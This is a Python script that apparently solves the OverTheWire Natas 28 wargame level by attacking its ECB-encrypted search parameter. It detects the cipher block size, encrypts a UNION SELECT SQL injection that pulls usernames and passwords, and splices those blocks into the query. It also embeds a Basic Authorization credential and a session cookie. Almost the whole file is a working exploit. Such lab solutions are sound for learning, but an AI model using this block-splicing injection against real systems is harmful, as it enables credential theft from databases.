#!/usr/bin/python
import urllib
import urllib2
import binascii
import base64
import urlparse
import struct
import string

# request to URL
def request_generate(URL, COOKIE='', data={}, debug = False):
    if debug:
        print """
        Url     : {},
        Cookie  : {},
        Data    : {},
        """.format(URL, COOKIE, data)
    req = urllib2.Request(URL, data=urllib.urlencode(data))
    req.add_header('User-Agent',  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMyODpKV3dSNDM4d2tnVHNOS0JiY0pvb3d5eXNkTTgyWWplRg==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174;' + COOKIE)
    return urllib2.urlopen(req)

# get cipher text (base64 decoded)
def get_cipher_query(*args, **kwargs):
    req = request_generate(*args, **kwargs)
    u = urlparse.parse_qs(req.url).values()[0][0]
    u = urllib.unquote(u)
    u = base64.b64decode(u)
    return u


# get blocksize
def get_block_size(URL):
    x = len(get_cipher_query(URL, data={'query':''})) # length of blank query
    for i in range(32):
        y = len(get_cipher_query(URL, data={'query':'a'*i}))
        if x!=y:
            return y-x
    
    return False



# main function
def main():
    # Configurations
    blocksize = 0

    # target url
    URL = 'http://natas28.natas.labs.overthewire.org/'

    # block size
    if blocksize==0:
        print "[+] Trying To Detect Cipher BlockSize."
        blocksize = get_block_size(URL)
        print "[+] Block Size Detected"

    print "[+] Cipher BlockSize is ", blocksize

    # after trying various conditions, i realize 13 length query will 
    # Trying To Detect Static  Lines
    #for i in range(35,50):
    #    q = 'b'*i
    #    c = get_cipher_query(URL, data = {'query':q})
    #    for p in range(len(c)/16):
    #        print "{} {} {}".format(i, ' '*p,repr(c[p*blocksize:(p*blocksize)+blocksize]))
    #    print "="*25
    #
    #
    # b*41 
    # 
    # 41  '\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
    # 41   '\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
    # 41    '\\\x80\\\xbd)\xfbc\xe2\xecSdS%\xc7\xa8\x96'
    # 41     '\x88\xa7\xbdr\xcd\xa2G\xda\xe1\xc3!\x9f\x05K.`'
    # 41      'P\x8f\x19\xc2wd\xe3\x16\x84x\x04\xcf\xa9Y\x90\x1e'
    # 41       '\xa0\x95"\xf3\x01\xcf\x9d6\xacp#\xf1e\x94\x8cZ'
    # 41        '\x979\xcd\x90R/\xa7\xa8o\x95w;V\xf9\xf8\xc0'
    #
    #  b*42
    #
    # 42  '\x1b\xe8%\x11\xa7\xba[\xfdW\x8c\x0e\xefFm\xb5\x9c'
    # 42   '\xdc\x84r\x8f\xdc\xf8\x9d\x93u\x1d\x10\xa7\xc7\\\x8c\xf2'
    # 42    '\\\x80\\\xbd)\xfbc\xe2\xecSdS%\xc7\xa8\x96'
    # 42     '\x88\xa7\xbdr\xcd\xa2G\xda\xe1\xc3!\x9f\x05K.`'
    # 42      '\x88\xa7\xbdr\xcd\xa2G\xda\xe1\xc3!\x9f\x05K.`'
    # 42       's\x8a_\xfbJE\x00$gu\x17Z\xe5\x96\xbb\xd6'
    # 42        "\xf3M\xf39\xc6\x9e\xdc\xe1\x1ffP\xbb\xce\xd6'\x02"
    #
    #
    match = get_cipher_query(URL, data={'query':'b'*41})
    match = match[64:80]
    print '[+] Block To Iterate : ', repr(match)
    found = ''
    for i in string.printable[65:]:
        print "[+] Trying : ", i
        q = 'b'*41
        q+= found
        c = get_cipher_query(URL, data={'query':q+i})
        c = c[64:80]
        if c == match:
            print "[+] Match Found : ", i
            found += i
            break
    # only one character will be found, because as we can test manually into website, it's escaping
    # ' characters so,it's means our cipher ending is some like this 
    # query = [Some Static String ] + [Our Query] + %' + [Again, Some Static String] 
    new_sql = " DO SLEEP(10);"
    new_sql = " UNION ALL SELECT concat(username,0x3A,password) FROM users #"

    sql = make_sql_statement(new_sql) 
    sql = encrypt_statement(URL, sql)
    q = inject_query_statement(URL, sql)
    answer = request_generate("http://natas28.natas.labs.overthewire.org/search.php/?query="+q)
    print answer.read().split('\n')[24]
    return

# function to slice cipher block and wisely insert our malicious cipher text
def inject_query_statement(URL, encryptsql):
    # because our input block complete at 42 character input, and as we found in iteration that
    # it has %' more characters, So we are going to pass 40 character input. 
    # because our block complete over 42, it will also encrypt 2 more forward character.

    # Hence, query = [ CONSTANT STRING + OUR INPUT + %' ] [ OUR MALICIOUS CIPHER ] [Comment]

    c = get_cipher_query(URL, data={'query':'b'*40})
    a = c[:80]+ encryptsql + c[-16:]
    a = base64.b64encode(a)
    a = urllib.quote(a)
    print "[+] Generated Query : ", a
    return a

# simply  pass statement in bunch of 16 character and extract it
def encrypt_statement(URL, statement, querybuffer='b'*42):
    c = get_cipher_query(URL, data={'query':querybuffer+statement})
    return c[80:80+len(statement)]

#
def make_sql_statement(SQL, blocksize=16):
    sql = SQL
    sql += '#'*int(blocksize -  (len(sql) % blocksize))
    print "[+] SQL Statement Generated. Length : ", len(sql)
    return sql


if __name__=='__main__':
    main()
